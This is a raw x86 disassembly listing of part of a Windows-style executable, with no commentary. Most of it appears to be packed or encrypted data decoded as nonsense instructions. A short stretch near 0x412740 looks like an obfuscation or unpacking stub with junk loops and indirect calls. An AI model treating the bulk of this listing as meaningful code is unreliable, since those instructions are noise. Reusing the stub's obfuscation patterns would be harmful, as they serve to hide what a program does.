  412677:	test   BYTE PTR [ebx],0x99
  41267a:	int    0x71
  41267c:	dec    ecx
  41267d:	push   ebx
  41267e:	mov    dl,0xbb
  412680:	push   ss
  412681:	shl    dh,cl
  412683:	sbb    eax,0x606d1e12
  412688:	sti    
  412689:	add    BYTE PTR [esi],ch
  41268b:	pop    ecx
  41268c:	shl    BYTE PTR [eax+0xa8d7c0f],1
  412692:	push   esp
  412693:	jl     0x41263b
  412695:	jnp    0x4126b5
  412697:	mov    ebp,0xafd06538
  41269c:	sub    ecx,edi
  41269e:	xor    bh,BYTE PTR [esi+edx*8-0x45]
  4126a2:	jne    0x4126db
  4126a4:	xchg   edi,eax
  4126a5:	adc    BYTE PTR ds:0x6609a83d,ah
  4126ab:	stos   DWORD PTR es:[edi],eax
  4126ac:	retf   0x4714
  4126af:	xchg   BYTE PTR [ebx+0x2a],bh
  4126b2:	iret   
  4126b3:	jmp    0x7ef40df5
  4126b8:	lds    ebx,FWORD PTR [ebx-0x3a]
  4126bb:	hlt    
  4126bc:	fadd   DWORD PTR [esi]
  4126be:	xor    DWORD PTR ds:0xe92d839b,ebp
  4126c4:	add    al,0xf5
  4126c6:	sub    esp,ebp
  4126c8:	pop    eax
  4126c9:	cmp    al,0x30
  4126cb:	(bad)  [ebp-0x1a]
  4126ce:	cwde   
  4126cf:	bound  esp,QWORD PTR [esi-0x3d]
  4126d2:	xor    BYTE PTR [esi+ebp*8-0x71],bh
  4126d6:	mov    ecx,0xa4f70021
  4126db:	lock cmp DWORD PTR [ebp-0x1c4e2851],edx
  4126e2:	cmp    bl,al
  4126e4:	lock retf 0x4522
  4126e8:	mov    dl,bh
  4126ea:	ins    DWORD PTR es:[edi],dx
  4126eb:	xor    al,0x4a
  4126ed:	lahf   
  4126ee:	add    BYTE PTR [eax+0x4a],dh
  4126f1:	pop    ds
  4126f2:	dec    esi
  4126f3:	inc    edx
  4126f4:	sti    
  4126f5:	test   al,0x6d
  4126f7:	arpl   WORD PTR [ebx-0x1],dx
  4126fa:	icebp  
  4126fb:	jle    0x4126e0
  4126fd:	pop    ds
  4126fe:	sbb    edi,DWORD PTR [eax-0x19]
  412701:	test   al,0xf0
  412703:	fcomp  QWORD PTR [eax+0x575f137c]
  412709:	xchg   edi,eax
  41270a:	jmp    0xbd36cf0f
  41270f:	leave  
  412710:	js     0x412696
  412712:	adc    DWORD PTR [esi-0x791340fb],edx
  412718:	je     0x4126e7
  41271a:	or     eax,0x7202a6c2
  41271f:	scas   eax,DWORD PTR es:[edi]
  412720:	sub    BYTE PTR [edi],dh
  412722:	in     eax,dx
  412723:	pop    es
  412724:	add    BYTE PTR [ebx+edi*2],al
  412727:	pop    ebx
  412728:	add    BYTE PTR [esi],ah
  41272a:	adc    DWORD PTR [esi],edx
  41272c:	lea    ebp,[esi+ebp*8]
  41272f:	ror    DWORD PTR [eax],cl
  412731:	inc    ebx
  412732:	inc    esp
  412733:	outs   dx,DWORD PTR ds:[esi]
  412734:	cmc    
  412735:	in     eax,dx
  412736:	or     edi,esp
  412738:	cmp    al,0x89
  41273a:	pop    ebp
  41273b:	jmp    0x414bea
  412740:	push   ebp
  412741:	mov    ebp,esp
  412743:	push   ecx
  412744:	and    DWORD PTR ds:0x42f008,0x0
  41274e:	xor    edx,edx
  412750:	xor    edx,DWORD PTR ds:0x42f008
  412756:	inc    edx
  412757:	mov    DWORD PTR ds:0x42f008,edx
  41275d:	cmp    DWORD PTR ds:0x42f008,0x23
  412764:	jne    0x412775
  41276a:	push   0x249b
  41276f:	call   DWORD PTR ds:0x42a018
  412775:	cmp    DWORD PTR ds:0x42f008,0x1b
  41277c:	jb     0x41274e
  412782:	adc    DWORD PTR ds:0x432018,0x7a8d
  41278c:	push   ecx
  41278d:	mov    DWORD PTR ds:0x430000,0x18
  412797:	cmp    DWORD PTR ds:0x430000,0x0
  41279e:	je     0x4127e2
  4127a4:	cmp    DWORD PTR ds:0x430000,0x1a
  4127ab:	jne    0x4127cf
  4127b1:	push   0x423947
  4127b6:	push   DWORD PTR [ebp-0x18]
  4127b9:	push   0x1433
  4127be:	push   DWORD PTR [ebp-0x24]
  4127c1:	push   0x3705
  4127c6:	push   DWORD PTR [ebp-0x18]
  4127c9:	call   DWORD PTR ds:0x42a01c
  4127cf:	xor    eax,eax
  4127d1:	or     eax,DWORD PTR ds:0x430000
  4127d7:	dec    eax
  4127d8:	mov    ds:0x430000,eax
  4127dd:	jmp    0x412797
  4127e2:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4127e9:	mov    ecx,DWORD PTR ds:0x41c383
  4127ef:	mov    eax,ds:0x41c397
  4127f4:	sub    eax,ecx
  4127f6:	and    ecx,DWORD PTR [ecx+eax*1]
  4127f9:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  412800:	sbb    DWORD PTR ds:0x430010,0xd0
  41280a:	mov    eax,DWORD PTR [ebp-0x4]
  41280d:	sub    edx,edx
  41280f:	push   esi
  412810:	and    ecx,ecx
  412812:	mov    esi,DWORD PTR [ebp-0x8]
  412815:	mov    edx,0x7510891
  41281a:	not    ecx
  41281c:	xor    eax,edx
  41281e:	sbb    DWORD PTR ds:0x431010,edx
  412824:	xor    esi,edx
  412826:	adc    DWORD PTR ds:0x432018,ecx
  41282c:	mov    ecx,0x3272d9
  412831:	add    esi,ecx
  412833:	add    eax,ecx
  412835:	imul   eax,esi
  412838:	mov    esi,DWORD PTR [ebp+0xc]
  41283b:	cmp    esi,eax
  41283d:	jne    0x412859
  412843:	mov    eax,DWORD PTR [ebp-0x4]
  412846:	mov    esi,DWORD PTR [ebp-0x8]
  412849:	xor    eax,edx
  41284b:	xor    esi,edx
  41284d:	add    eax,ecx
  41284f:	add    esi,ecx
  412851:	imul   eax,esi
  412854:	jmp    0x414be5
  412859:	mov    eax,DWORD PTR [ebp+0xc]
  41285c:	mov    eax,DWORD PTR [eax+0x78]
  41285f:	jmp    0x414bb0
  412864:	paddq  mm3,QWORD PTR [eax+ebp*4-0x6cfc979d]
  41286c:	ror    bl,0x5f
  41286f:	jne    0x41287e
  412871:	or     al,0xfe
  412873:	pushf  
  412874:	ret    
  412875:	imul   esp,DWORD PTR [eax+0x60],0x2c
  412879:	pop    edi
  41287a:	pusha  
  41287b:	pusha  
  41287c:	push   ds
  41287d:	jne    0x412813
  41287f:	and    bh,dh
  412881:	or     DWORD PTR [edx],ebp
  412883:	adc    BYTE PTR [ebx+0x37e496c],dl
  412889:	or     dl,BYTE PTR [ecx]
  41288b:	push   es
  41288c:	call   0x2556:0x8677c035
  412893:	punpckhbw mm0,QWORD PTR [ebx-0x70]
  412897:	repz ret 
  412899:	nop
  41289a:	cdq    
  41289b:	adc    eax,0x76d0bcf1
  4128a0:	push   eax
  4128a1:	jne    0x41291c
  4128a3:	inc    esp
  4128a4:	cmp    eax,0xd488a6be
  4128a9:	push   es
  4128aa:	dec    eax
  4128ab:	pop    edx
  4128ac:	cmp    DWORD PTR [ebp-0x6b955be9],eax
  4128b2:	add    eax,0x2c3e03f2
  4128b7:	or     bh,BYTE PTR [ebx+eax*2]
  4128ba:	pop    edx
  4128bb:	jo     0x4128eb
  4128bd:	clc    
  4128be:	repz out dx,eax
  4128c0:	retf   
  4128c1:	pusha  
  4128c2:	xchg   esi,eax
  4128c3:	sti    
  4128c4:	mov    cl,0x15
  4128c6:	imul   ecx,DWORD PTR [ebx+0x3d03adbf],0x4dbcb732
  4128d0:	fidiv  DWORD PTR [edi-0x7e50ee78]
  4128d6:	dec    esp
  4128d7:	dec    edx
  4128d8:	dec    eax
  4128d9:	imul   eax,DWORD PTR [edi+eiz*2+0x65],0xfffffffa
  4128de:	iret   
  4128df:	in     al,0xba
  4128e1:	push   0xe53db5e4
  4128e6:	repnz loope 0x4128e1
  4128e9:	in     eax,0x5
  4128eb:	jmp    0xe2da:0x62e55255
  4128f2:	cmp    BYTE PTR [edx+0x6cabe38b],0xf1
  4128f9:	hlt    
  4128fa:	les    eax,FWORD PTR [esi-0x72]
  4128fd:	push   cs
  4128fe:	shl    DWORD PTR [esp+ebp*1-0x196e928b],0x6d
  412906:	jp     0x412930
  412908:	jg     0x4128dc
  41290a:	stos   DWORD PTR es:[edi],eax
  41290b:	shl    DWORD PTR [ebx+0x90c68ba],0xdf
  412912:	fimul  WORD PTR [ebx+0x38b14e24]
  412918:	es in  al,0x7
  41291b:	iret   
  41291c:	aam    0xb9
  41291e:	push   ss
  41291f:	shr    DWORD PTR [edi],cl
  412921:	push   edx
  412922:	mov    ecx,DWORD PTR [edx-0x2b]
  412925:	sbb    dh,bh
  412927:	jecxz  0x41296a
  412929:	xchg   esp,eax
  41292a:	mov    ecx,0xe9fbd4ad
  41292f:	jae    0x412973
  412931:	cli    
  412932:	mov    ds,WORD PTR [ebx+0x49]
  412935:	add    eax,0x9151915e
  41293a:	add    eax,0x2372e35a
  41293f:	(bad)  
  412941:	(bad)  [edi]
  412943:	sub    esp,DWORD PTR [ebp-0x53]
  412946:	jns    0x4129c4
  412948:	test   BYTE PTR [esi+ecx*1-0x4e],dl
  41294c:	ret    
  41294d:	cmp    dl,BYTE PTR [edx]
  41294f:	les    ecx,FWORD PTR [edi-0x7]
  412952:	jne    0x4129d3
  412954:	mov    eax,0x85d17b37
  412959:	mov    ds:0x4c8ed62,eax
  41295e:	sub    dh,al
  412960:	iret   
  412961:	adc    eax,edi
  412963:	(bad)  
  412964:	sahf   
  412965:	cld    
  412966:	dec    ecx
  412967:	inc    eax
  412968:	push   eax
  412969:	dec    eax
  41296a:	mov    ds:0x6905745b,al
  41296f:	adc    edx,DWORD PTR [edx+0x34daff4e]
  412975:	xor    eax,ecx
  412977:	ja     0x412992
  412979:	cmp    ah,cl
  41297b:	xlat   BYTE PTR ds:[ebx]
  41297c:	sub    BYTE PTR [ebp+0x69a22fa9],bh
  412982:	inc    esi
  412983:	enter  0xcabc,0xdd
  412987:	dec    edx
  412988:	push   esp
  412989:	pop    ds
  41298a:	push   ecx
  41298b:	es pop ds
  41298d:	xor    ebp,DWORD PTR [ecx-0x70]
  412990:	push   edi
  412991:	inc    esp
  412992:	pop    ds
  412993:	pop    ss
  412994:	pop    ss
  412995:	ss leave 
  412997:	jge    0x412945
  412999:	or     al,0xd5
  41299b:	push   cs
  41299c:	je     0x412a02
  41299e:	lahf   
  41299f:	fldcw  WORD PTR [ebx+0x98eb7af]
  4129a5:	mov    eax,ds:0x255db903
  4129aa:	adc    al,0x60
  4129ac:	and    al,0x97
  4129ae:	das    
  4129af:	out    0x17,eax
  4129b1:	sbb    dl,BYTE PTR [ecx-0x674f1ae2]
  4129b7:	gs mov eax,0xf2088734
  4129bd:	iret   
  4129be:	sbb    BYTE PTR [ebx],bl
  4129c0:	xchg   edi,eax
  4129c1:	cs cli 
  4129c3:	xchg   edx,eax
  4129c4:	inc    ebx
  4129c5:	or     ax,0x4b32
  4129c9:	pop    ebp
  4129ca:	mov    fs,ecx
  4129cc:	popa   
  4129cd:	and    eax,ebp
  4129cf:	(bad)  
  4129d0:	stc    
  4129d1:	cdq    
  4129d2:	nop
  4129d3:	fdivr  DWORD PTR [ecx]
  4129d5:	sbb    BYTE PTR [eax-0x6],ch
  4129d8:	add    DWORD PTR [edi+0x57],edx
  4129db:	frstor [esi]
  4129dd:	cmp    DWORD PTR [esi],0xffffffbf
  4129e0:	(bad)  
  4129e2:	test   al,0xe
  4129e4:	mul    DWORD PTR [eax+edx*2]
  4129e7:	aaa    
  4129e8:	dec    edx
  4129e9:	mov    ecx,0x5efa37f6
  4129ee:	mov    ah,0xfc
  4129f0:	loopne 0x412a42
  4129f2:	scas   eax,DWORD PTR es:[edi]
  4129f3:	(bad)  
  4129f4:	lods   eax,DWORD PTR ds:[esi]
  4129f5:	pop    es
  4129f6:	xor    eax,0x374264bf
  4129fb:	mov    DWORD PTR [edx+0x27],eax
  4129fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ff:	add    BYTE PTR [ecx+esi*4-0x32471ea8],dl
  412a06:	mov    cl,0xd7
  412a08:	hlt    
  412a09:	adc    esp,DWORD PTR [esi+0x59e9d6b2]
  412a0f:	out    dx,al
  412a10:	out    0xe1,al
  412a12:	pop    esi
  412a13:	call   0x606f:0x2e8bd646
  412a1a:	inc    edx
  412a1b:	ins    BYTE PTR es:[edi],dx
  412a1c:	mov    bh,cl
  412a1e:	lea    esi,[ecx-0x47]
  412a21:	test   BYTE PTR [edx+0x46],0x76
  412a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a26:	out    0xc6,eax
  412a28:	aas    
  412a29:	mov    WORD PTR ds:0x49ee44ea,ss
  412a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a30:	lods   al,BYTE PTR ds:[esi]
  412a31:	popa   
  412a32:	push   ds
  412a33:	add    cl,dh
  412a35:	rcl    BYTE PTR [edi-0x25f857dc],cl
  412a3b:	jmp    0x412a06
  412a3d:	sbb    esp,DWORD PTR [edi+0x2d]
  412a40:	dec    edi
  412a41:	inc    edx
  412a42:	outs   dx,BYTE PTR ds:[esi]
  412a43:	push   es
  412a44:	outs   dx,DWORD PTR ds:[esi]
  412a45:	mov    WORD PTR [esi],ss
  412a47:	div    bl
  412a49:	cmovo  edx,edx
  412a4c:	lock shl BYTE PTR [eax+ebx*4],1
  412a50:	ss push ebp
  412a52:	push   esi
  412a53:	aas    
  412a54:	mov    ch,0x97
  412a56:	sub    DWORD PTR ds:[edi+0x2b],edx
  412a5a:	sbb    BYTE PTR [eax-0x28],dh
  412a5d:	cld    
  412a5e:	aas    
  412a5f:	jl     0x412acb
  412a61:	inc    DWORD PTR [esp+edi*1-0x73ae7502]
  412a68:	dec    ebp
  412a69:	mov    al,ds:0xa9afd5dc
  412a6e:	dec    esp
  412a6f:	fsubr  st,st(6)
  412a71:	popa   
  412a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a73:	shr    DWORD PTR [esi-0x55],1
  412a76:	(bad)  
  412a77:	sub    eax,0xcac4399d
  412a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a7d:	test   DWORD PTR [edi],esi
  412a7f:	sbb    eax,0x3555ecbc
  412a84:	mov    ds:0xf5ac4499,eax
  412a89:	daa    
  412a8a:	jmp    0x412a29
  412a8c:	jmp    0x752f:0x38d4c68b
  412a93:	int3   
  412a94:	xchg   ebx,eax
  412a95:	dec    ebx
  412a96:	les    ebx,FWORD PTR [ebp+0x6a6e42f2]
  412a9c:	ins    DWORD PTR es:[edi],dx
  412a9d:	and    BYTE PTR ds:[eax+0x5e501146],0xf7
  412aa5:	jno    0x412aa9
  412aa7:	retf   0x65ef
  412aaa:	(bad)  
  412aab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aac:	jmp    0xc490ad28
  412ab1:	wrmsr  
  412ab3:	cmp    eax,0x3f7d17ba
  412ab8:	scas   eax,DWORD PTR es:[edi]
  412ab9:	push   ebp
  412aba:	leave  
  412abb:	adc    bh,BYTE PTR [esi-0x70]
  412abe:	(bad)  
  412abf:	sti    
  412ac0:	push   es
  412ac1:	cmp    edi,0xfcd32767
  412ac7:	dec    edi
  412ac8:	in     al,dx
  412ac9:	stc    
  412aca:	ret    0x2ddb
  412acd:	pop    edi
  412ace:	loop   0x412aeb
  412ad0:	scas   al,BYTE PTR es:[edi]
  412ad1:	and    DWORD PTR [ebp-0x3664f6f8],esi
  412ad7:	push   edi
  412ad8:	rol    BYTE PTR [eax-0x29],cl
  412adb:	out    0x1d,eax
  412add:	xchg   DWORD PTR [esi],esp
  412adf:	hlt    
  412ae0:	test   eax,0xb0e04fbe
  412ae5:	xchg   esi,eax
  412ae6:	jo     0x412b38
  412ae8:	mov    ch,0x1c
  412aea:	(bad)
  412aee:	add    bh,BYTE PTR [edi-0x7bed76d2]
  412af4:	jmp    0x412b23
  412af6:	adc    dl,al
  412af8:	or     BYTE PTR [esi],dh
  412afa:	loopne 0x412b20
  412afc:	(bad)  
  412afd:	pop    edx
  412afe:	sub    eax,0x5c0576ac
  412b03:	(bad)  
  412b04:	jnp    0x412b7d
  412b06:	cmp    eax,0xf2ce525f
  412b0b:	stos   BYTE PTR es:[edi],al
  412b0c:	ror    DWORD PTR [ecx+0x5c],0xfd
  412b10:	into   
  412b11:	cmp    eax,edi
  412b13:	fadd   QWORD PTR ds:0xe2a42900
  412b19:	out    0xf2,eax
  412b1b:	add    eax,0xd4285710
  412b20:	fsubr  DWORD PTR [ebx+0x61]
  412b23:	xchg   edx,eax
  412b24:	cld    
  412b25:	sub    DWORD PTR [ebp+0x58],0xeb118ba8
  412b2c:	push   es
  412b2d:	add    DWORD PTR [esi+0x3b],edi
  412b30:	and    DWORD PTR [eax],edx
  412b32:	or     BYTE PTR [ebp+0x13],0x5f
  412b36:	jmp    0x39c2:0xfea60f55
  412b3d:	push   ss
  412b3e:	int    0x55
  412b40:	loope  0x412b7c
  412b42:	(bad)  
  412b43:	ja     0x412ad0
  412b45:	inc    ebx
  412b46:	pop    ebp
  412b47:	outs   dx,DWORD PTR ds:[esi]
  412b48:	lods   al,BYTE PTR ds:[esi]
  412b49:	inc    edx
  412b4a:	inc    ebp
  412b4b:	dec    edi
  412b4c:	adc    esp,ecx
  412b4e:	repnz enter 0xc6c,0x1d
  412b53:	mov    ds:0x9350fe8,al
  412b58:	pop    edx
  412b59:	repnz adc al,ah
  412b5c:	inc    ebx
  412b5d:	xchg   edx,eax
  412b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b5f:	add    eax,DWORD PTR [edi+0x43]
  412b62:	pop    eax
  412b63:	push   ecx
  412b64:	sbb    eax,0x547f2b50
  412b69:	das    
  412b6a:	mov    edx,ecx
  412b6c:	xlat   BYTE PTR ds:[ebx]
  412b6d:	add    edi,DWORD PTR [esp+esi*4]
  412b70:	inc    dh
  412b72:	jnp    0x412b50
  412b74:	test   eax,0xe947504f
  412b79:	test   BYTE PTR [ecx+0x4a],dl
  412b7c:	scas   al,BYTE PTR es:[edi]
  412b7d:	cmc    
  412b7e:	loope  0x412b7a
  412b80:	push   ebp
  412b81:	je     0x412b86
  412b83:	fs cdq 
  412b85:	pop    esi
  412b86:	jg     0x412bc6
  412b88:	mov    esp,0x327b169a
  412b8d:	nop
  412b8e:	arpl   WORD PTR [edi+0x68],si
  412b91:	inc    ebp
  412b92:	xor    eax,0x1b1188f3
  412b97:	out    dx,eax
  412b98:	cmp    edi,DWORD PTR [edx]
  412b9a:	int3   
  412b9b:	and    edx,DWORD PTR [ebp+0x4759a623]
  412ba1:	cmp    eax,0x8fd51324
  412ba6:	mov    dh,0x48
  412ba8:	dec    edx
  412ba9:	mov    cl,0x59
  412bab:	lods   al,BYTE PTR ds:[esi]
  412bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bad:	and    eax,0xa2d0009f
  412bb2:	push   esi
  412bb3:	push   0x21
  412bb5:	fwait
  412bb6:	xchg   ebp,eax
  412bb7:	mul    BYTE PTR [ecx-0x27]
  412bba:	les    esi,FWORD PTR [esi+0x1d]
  412bbd:	(bad)  
  412bbe:	pushf  
  412bbf:	in     al,0x40
  412bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bc2:	mov    esp,DWORD PTR [edi+0x32c8474a]
  412bc8:	stos   DWORD PTR es:[edi],eax
  412bc9:	and    al,0x8a
  412bcb:	pusha  
  412bcc:	(bad)
  412bcf:	mov    esi,0xe8f88b3e
  412bd4:	addr16 push eax
  412bd6:	call   0xdde6:0x758cd769
  412bdd:	lds    esi,FWORD PTR [ebx+0x65]
  412be0:	mov    esi,DWORD PTR [esi]
  412be2:	mov    bl,0xf5
  412be4:	(bad)  
  412be5:	out    0xd5,eax
  412be7:	adc    dh,BYTE PTR [edi-0x69]
  412bea:	sub    edx,DWORD PTR [ebx]
  412bec:	loopne 0x412bdf
  412bee:	in     al,dx
  412bef:	js     0x412c64
  412bf1:	ret    0x50d9
  412bf4:	test   al,0x52
  412bf6:	lahf   
  412bf7:	sub    al,0xf5
  412bf9:	jmp    0xbbefe1a5
  412bfe:	push   edi
  412bff:	mov    ecx,0x20f44ff1
  412c04:	mov    dh,0xcc
  412c06:	sub    bh,BYTE PTR [ebx]
  412c08:	mov    cl,0x25
  412c0a:	sti    
  412c0b:	xor    esp,0xffffffa6
  412c0e:	mov    ebx,0x9e5c1bfa
  412c13:	dec    ecx
  412c14:	cwde   
  412c15:	xchg   BYTE PTR [ebx],al
  412c17:	sbb    ebp,DWORD PTR [ebp-0x79031379]
  412c1d:	pusha  
  412c1e:	fsub   st(5),st
  412c20:	push   esi
  412c21:	pushf  
  412c22:	cwde   
  412c23:	stos   BYTE PTR es:[edi],al
  412c24:	jg     0x412bc7
  412c26:	aaa    
  412c27:	shr    DWORD PTR [ebx+0x77],cl
  412c2a:	fadd   st,st(0)
  412c2c:	lods   eax,DWORD PTR ds:[esi]
  412c2d:	sub    bh,dl
  412c2f:	inc    esi
  412c30:	mov    BYTE PTR [ebx-0x563d1204],dl
  412c36:	leave  
  412c37:	mov    cl,0x4f
  412c39:	pop    ds
  412c3a:	bnd call DWORD PTR [edx+0x40]
  412c3e:	jmp    FWORD PTR [edi+0x7a]
  412c41:	and    al,0x58
  412c43:	jg     0x412c2a
  412c45:	dec    eax
  412c46:	pop    edx
  412c47:	mov    BYTE PTR [ebx],cl
  412c49:	jg     0x412c66
  412c4b:	retf   0xc00a
  412c4e:	add    edx,edx
  412c50:	in     eax,0xc9
  412c52:	cdq    
  412c53:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c55:	xor    ch,BYTE PTR [ecx+eiz*4-0x56896ceb]
  412c5c:	xlat   BYTE PTR ds:[ebx]
  412c5d:	in     al,0xee
  412c5f:	or     edx,DWORD PTR [ecx+0x7d64365e]
  412c65:	jmp    0x412ca6
  412c67:	sbb    BYTE PTR [ecx-0xfb61ca6],ah
  412c6d:	mov    dl,0x6c
  412c6f:	int3   
  412c70:	and    eax,0x6ca288c0
  412c76:	pop    es
  412c77:	lock mov ecx,ebx
  412c7a:	mov    ch,0x12
  412c7c:	pop    edx
  412c7d:	push   edx
  412c7e:	push   0xaa7a067a
  412c83:	in     al,dx
  412c84:	pop    esi
  412c85:	gs cdq 
  412c87:	push   esp
  412c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c89:	je     0x412ca4
  412c8b:	push   esi
  412c8c:	js     0x412c58
  412c8e:	(bad)  
  412c8f:	sub    eax,0x5ac94242
  412c94:	or     DWORD PTR [ebx+0x13],edx
  412c97:	pop    ebx
  412c98:	js     0x412ccb
  412c9a:	aaa    
  412c9b:	push   ebp
  412c9c:	and    eax,DWORD PTR [edx]
  412c9e:	ss call 0x92ec:0x5b84a4c7
  412ca6:	push   ebx
  412ca7:	pop    esi
  412ca8:	xor    esp,eax
  412caa:	push   eax
  412cab:	sub    DWORD PTR [ecx],edi
  412cad:	ud0    eax,DWORD PTR [ebx]
  412cb0:	cwde   
  412cb1:	in     eax,dx
  412cb2:	adc    DWORD PTR [eax-0x7e],edi
  412cb5:	addr16 pop edx
  412cb7:	jae    0x412cf0
  412cb9:	sbb    ecx,edi
  412cbb:	xlat   BYTE PTR ds:[ebx]
  412cbc:	sub    BYTE PTR [ecx+0x74],dh
  412cbf:	push   es
  412cc0:	jl     0x412c8e
  412cc2:	pop    edx
  412cc3:	fisttp DWORD PTR [eax-0x6]
  412cc6:	jle    0x412ca8
  412cc8:	inc    DWORD PTR [edi]
  412cca:	int3   
  412ccb:	dec    BYTE PTR [ebx+0x6a8c1c29]
  412cd1:	ret    0xa581
  412cd4:	out    0x4c,eax
  412cd6:	pushf  
  412cd7:	out    0xa5,al
  412cd9:	sti    
  412cda:	std    
  412cdb:	rcl    BYTE PTR [ebx],cl
  412cdd:	test   eax,0x8f2986a9
  412ce2:	adc    eax,0x4dd21803
  412ce7:	xchg   edi,eax
  412ce8:	xor    esp,DWORD PTR ds:0xb43ba74
  412cee:	scas   eax,DWORD PTR es:[edi]
  412cef:	cmp    ch,BYTE PTR [ebx-0x13b198b7]
  412cf5:	fs enter 0x9317,0x48
  412cfa:	jge    0x412cd6
  412cfc:	sub    al,0x72
  412cfe:	out    0x8d,al
  412d00:	fldcw  WORD PTR [eax]
  412d02:	xchg   DWORD PTR [ebp-0x6507b42c],eax
  412d08:	jnp    0x412c94
  412d0a:	mov    esi,0x81ca4460
  412d0f:	adc    BYTE PTR [eax+0x72b261ed],al
  412d15:	or     eax,0x62a046ef
  412d1a:	push   ss
  412d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1c:	es dec eax
  412d1e:	jp     0x412cc7
  412d20:	aad    0x5d
  412d22:	lahf   
  412d23:	dec    BYTE PTR [edi-0x4fc74691]
  412d29:	jecxz  0x412cad
  412d2b:	ss icebp 
  412d2d:	inc    ebp
  412d2e:	jno    0x412d89
  412d30:	jno    0x412d43
  412d32:	inc    edi
  412d33:	in     al,0x59
  412d35:	ins    BYTE PTR es:[edi],dx
  412d36:	sbb    al,0xab
  412d38:	sbb    edx,ebp
  412d3a:	push   cs
  412d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d3c:	mov    ecx,0xc95c5cdb
  412d41:	or     BYTE PTR [edi+0x26e8d732],cl
  412d47:	test   DWORD PTR [ebx+0x19186b22],ebx
  412d4d:	mov    dh,0xc9
  412d4f:	fcom   QWORD PTR [eax+0x7f489dd4]
  412d55:	sub    eax,0x56bcfd57
  412d5a:	lea    ebx,[ecx+0x65c56679]
  412d60:	jno    0x412d58
  412d62:	nop
  412d63:	xchg   esp,eax
  412d64:	loope  0x412d6d
  412d66:	pop    ds
  412d67:	sub    DWORD PTR [edi-0x1cdf22b2],0xd4c52b04
  412d71:	sar    BYTE PTR ds:0x4845ac52,0xcf
  412d78:	dec    eax
  412d79:	add    cl,BYTE PTR [ecx+esi*1-0x41ed73a4]
  412d80:	add    al,0x6e
  412d82:	retf   
  412d83:	inc    edi
  412d84:	xor    al,0x78
  412d86:	cli    
  412d87:	loope  0x412db6
  412d89:	stos   DWORD PTR es:[edi],eax
  412d8a:	fistp  DWORD PTR [edi+0x6f4a48c1]
  412d90:	jae    0x412d87
  412d92:	pop    eax
  412d93:	aam    0x81
  412d95:	(bad)  
  412d96:	test   DWORD PTR [ebx],0x14606d50
  412d9c:	mov    edx,0xbbbc3a18
  412da1:	xlat   BYTE PTR ds:[ebx]
  412da2:	and    al,0xf1
  412da5:	lods   eax,DWORD PTR ds:[esi]
  412da6:	fsubr  st,st(5)
  412da8:	xor    edx,DWORD PTR [ebx-0x274d6149]
  412dae:	pop    ss
  412daf:	jmp    0xe22c:0xe1c2b8ff
  412db6:	sub    dl,BYTE PTR [ecx]
  412db8:	push   esp
  412db9:	pop    ebx
  412dba:	dec    eax
  412dbb:	adc    DWORD PTR [esi],ebp
  412dbd:	dec    ecx
  412dbe:	sub    eax,DWORD PTR [ecx+0x10]
  412dc1:	int    0x9c
  412dc3:	repz jns 0x412d89
  412dc6:	test   BYTE PTR [edi-0x55],dh
  412dc9:	push   edx
  412dca:	sbb    BYTE PTR [ebx+0x60],al
  412dcd:	mov    al,0x63
  412dcf:	or     DWORD PTR [eax-0x68],0x52
  412dd3:	mov    eax,0xec9560fe
  412dd8:	rcl    BYTE PTR [ecx+0x26faafc],cl
  412dde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ddf:	adc    BYTE PTR [edi+0x4f],bl
  412de2:	xchg   ebx,eax
  412de3:	icebp  
  412de4:	outs   dx,BYTE PTR ds:[esi]
  412de5:	sub    DWORD PTR [eax-0x63],esp
  412de8:	(bad)  
  412de9:	pop    ebp
  412dea:	pop    es
  412deb:	test   BYTE PTR [ebp-0x3a],bl
  412dee:	xor    cl,dl
  412df0:	lods   al,BYTE PTR ds:[esi]
  412df1:	xchg   bh,ah
  412df3:	pushf  
  412df4:	stos   DWORD PTR es:[edi],eax
  412df5:	add    BYTE PTR [ebx+0x190fc097],bh
  412dfb:	scas   eax,DWORD PTR es:[edi]
  412dfc:	aad    0x73
  412dfe:	and    edx,DWORD PTR [ebx+0x35]
  412e01:	mov    esp,0xedc755a5
  412e06:	xor    al,0x95
  412e08:	inc    esi
  412e09:	das    
  412e0a:	jmp    0x229a507
  412e0f:	adc    eax,0x68c44eaf
  412e14:	mov    dl,0x77
  412e16:	xor    BYTE PTR [ebx],0x49
  412e19:	inc    eax
  412e1a:	ins    DWORD PTR es:[edi],dx
  412e1b:	mov    esp,DWORD PTR [esp+esi*2]
  412e1e:	rol    DWORD PTR [edi+eiz*8+0x9db820e],1
  412e25:	loope  0x412e1a
  412e27:	add    bh,BYTE PTR [esi+ebx*4+0x48fc10cd]
  412e2e:	add    eax,DWORD PTR [edi+0x376932ac]
  412e34:	dec    ecx
  412e35:	mov    ds:0x422bfed5,al
  412e3a:	ss sbb eax,0x20e1b14b
  412e40:	and    ch,BYTE PTR [edi]
  412e42:	inc    esi
  412e43:	ret    0x3790
  412e46:	pop    edi
  412e47:	adc    BYTE PTR ds:0x5d4b6fa2,dl
  412e4d:	adc    ebp,DWORD PTR [edx]
  412e4f:	add    al,0xeb
  412e51:	(bad)  
  412e53:	sahf   
  412e54:	aas    
  412e55:	dec    esp
  412e56:	xor    al,0x51
  412e58:	or     esp,DWORD PTR [ebp-0x40]
  412e5b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  412e5d:	lods   al,BYTE PTR ds:[esi]
  412e5e:	cld    
  412e5f:	test   al,0xe8
  412e61:	sub    al,0x78
  412e63:	mov    edx,0x33ae99fb
  412e68:	dec    ecx
